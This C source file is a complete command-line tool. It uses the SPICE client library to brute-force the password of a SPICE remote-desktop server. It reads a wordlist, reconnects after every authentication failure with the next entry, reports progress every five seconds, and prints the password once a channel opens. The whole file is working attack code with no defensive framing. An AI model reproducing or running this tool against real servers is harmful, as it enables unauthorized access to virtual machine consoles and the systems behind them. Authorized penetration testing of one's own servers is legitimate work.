#include <assert.h>
#include <errno.h>
#include <glib.h>
#include <spice-client.h>
#include <spice/vd_agent.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// #include "spice-utils.c"
#include "check.h"
#include "spice-channel-types.h"
#include "utils.h"

typedef struct {
    const char *uri;
    FILE *password_file;
    GMainLoop *loop;
    char *current_password;
    size_t password_sz;
    size_t password_count;
    size_t total_password_count;
} g_main_args_t;

void channel_new_cb(SpiceSession *session, SpiceChannel *channel, gpointer user_data);
void channel_destroy_cb(SpiceSession *session, SpiceChannel *channel, gpointer user_data);
void channel_event_cb(SpiceChannel *channel, SpiceChannelEvent event, gpointer user_data);
void disconnected_cb(SpiceSession *session, gpointer user_data);
void try_next_password(SpiceSession *session, g_main_args_t *args);
size_t count_passwords_in_file(FILE *f);
int print_status_cb(gpointer user_data);
int g_main(gpointer user_data);

int main(int argc, char *const argv[]) {
    if (argc != 3) {
        printf("usage: %s URI PASSWORD_FILE\n", program_invocation_short_name);
        printf("  URI: spice://HOST?port=PORT\n");
        return EXIT_FAILURE;
    }

    g_main_args_t args = {.uri = argv[1],
                          .password_file = NULL,
                          .loop = NULL,
                          .current_password = NULL,
                          .password_sz = 0,
                          .password_count = 0,
                          .total_password_count = 0};

    CHK_NULL(args.password_file = fopen(argv[2], "r"));
    args.total_password_count = count_passwords_in_file(args.password_file);
    printf("%lu passwords to try.", args.total_password_count);

    CHK_NULL(args.loop = g_main_loop_new(NULL, FALSE));
    g_idle_add(g_main, (void *)&args);
    g_timeout_add_seconds(5, print_status_cb, (void *)&args);
    g_main_loop_run(args.loop);
    g_main_loop_unref(args.loop);
    if (args.password_file != NULL) {
        fclose(args.password_file);
    }

    return EXIT_SUCCESS;
}

int g_main(gpointer user_data) {
    g_main_args_t *args = (g_main_args_t *)user_data;
    SpiceSession *session = NULL;

    CHK_NULL(session = spice_session_new());
    g_signal_connect(G_OBJECT(session), "channel-new", G_CALLBACK(channel_new_cb), user_data);
    g_signal_connect(G_OBJECT(session), "disconnected", G_CALLBACK(disconnected_cb), args->loop);

    g_object_set(session, "uri", args->uri, NULL);
    CHK_FALSE(spice_session_connect(session));

    return EXIT_SUCCESS;
}

void channel_destroy_cb(SpiceSession *_session, SpiceChannel *channel, gpointer user_data) {
    (void)_session;
    (void)user_data;

    printf("Channel %s deleted.\n", channel_to_string(channel));
}

void channel_new_cb(SpiceSession *_session, SpiceChannel *channel, gpointer user_data) {
    (void)_session;
    (void)user_data;
    gint channel_type = -1;

    printf("New channel created: %s\n", channel_to_string(channel));

    g_object_get(channel, "channel-type", &channel_type, NULL);

    switch (channel_type) {
    case SPICE_CHANNEL_MAIN:
        g_signal_connect(channel, "channel-event", G_CALLBACK(channel_event_cb), user_data);
        break;
    case SPICE_CHANNEL_INPUTS:
    case SPICE_CHANNEL_PLAYBACK:
    case SPICE_CHANNEL_CURSOR:
    case SPICE_CHANNEL_DISPLAY:
    case SPICE_CHANNEL_USBREDIR:
    case SPICE_CHANNEL_RECORD:
        break;
    default:
        g_signal_connect(channel, "channel-destroy", G_CALLBACK(channel_destroy_cb), NULL);
        break;
    }
}

void channel_event_cb(SpiceChannel *channel, SpiceChannelEvent event, gpointer user_data) {
    g_main_args_t *args = (g_main_args_t *)user_data;
    SpiceSession *session = NULL;

    g_object_get(channel, "spice-session", &session, NULL);

    switch (event) {
    case SPICE_CHANNEL_ERROR_AUTH:
        try_next_password(session, args);
        break;
    case SPICE_CHANNEL_OPENED: {
        const char *password = NULL;
        g_object_get(session, "password", &password, NULL);
        printf("Password: %s\n", password);
        spice_session_disconnect(session);
        g_main_loop_quit(args->loop);
        break;
    }
    default:
        printf("%s: event %s\n", channel_to_string(channel), channel_event_to_string(event));
        spice_session_disconnect(session);
        g_main_loop_quit(args->loop);
        break;
    }
}

int print_status_cb(gpointer user_data) {
    g_main_args_t *args = (g_main_args_t *)user_data;
    double percent = 100.0 * (double)args->password_count / (double)args->total_password_count;

    printf("Current password: '%s' (%lu/%lu %5.2f%%)\n", args->current_password,
           args->password_count, args->total_password_count, percent);
    return EXIT_SUCCESS;
}

void disconnected_cb(SpiceSession *_session, gpointer user_data) {
    (void)_session;
    GMainLoop *loop = (GMainLoop *)user_data;
    g_main_loop_quit(loop);
}

void try_next_password(SpiceSession *session, g_main_args_t *args) {
    ssize_t n;
    do {
        if ((n = getline(&args->current_password, &args->password_sz, args->password_file)) < 0) {
            g_main_loop_quit(args->loop);
            return;
        }
    } while (n <= 1);
    args->current_password[n - 1] = 0;
    args->password_count++;

#if 0
    {
        char *p = NULL;
        g_object_get(session, "password", &p, NULL);
        printf("Bad password: '%s'\n", p);
    }
#endif
    g_object_set(session, "password", args->current_password, NULL);
    spice_session_connect(session);
}

size_t count_passwords_in_file(FILE *f) {
    CHK_NEG(fseek(f, 0, SEEK_SET));
    size_t password_count = 0;
    char c;

    while (!feof(f)) {
        if (fscanf(f, "%c%*[^\n]\n", &c) == 1) {
            password_count++;
        }
    }

    CHK_NEG(fseek(f, 0, SEEK_SET));
    return password_count;
}
